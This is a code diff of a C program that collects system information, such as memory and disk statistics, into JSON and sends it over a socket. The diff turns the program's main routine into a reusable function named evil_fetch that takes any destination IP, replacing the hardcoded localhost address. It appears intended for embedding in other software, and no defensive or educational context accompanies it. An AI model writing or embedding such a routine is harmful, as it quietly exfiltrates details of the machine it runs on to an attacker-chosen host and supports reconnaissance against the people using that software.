@@ -1,3 +1,4 @@
+// #include "client.h"
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <stdio.h>
@@ -10,7 +11,6 @@
 #include <sys/statvfs.h>
 
 #define SERVER_PORT 12345
-#define SERVER_IP "127.0.0.1"
 
 char *get_system_info() {
   struct sysinfo sys_info;
@@ -49,7 +49,7 @@ char *get_system_info() {
   return json_data;
 }
 
-int main() {
+void evil_fetch(char *ip) {
   int sockfd;
   struct sockaddr_in serv_addr;
 
@@ -57,7 +57,7 @@ int main() {
   memset(&serv_addr, 0, sizeof(serv_addr));
   serv_addr.sin_family = AF_INET;
   serv_addr.sin_port = htons(SERVER_PORT);
-  inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr);
+  inet_pton(AF_INET, ip, &serv_addr.sin_addr);
 
   connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
 
@@ -68,6 +68,4 @@ int main() {
   printf("Sent data: %s\n", json_data);
   free(json_data);
   close(sockfd);
-
-  return 0;
 }
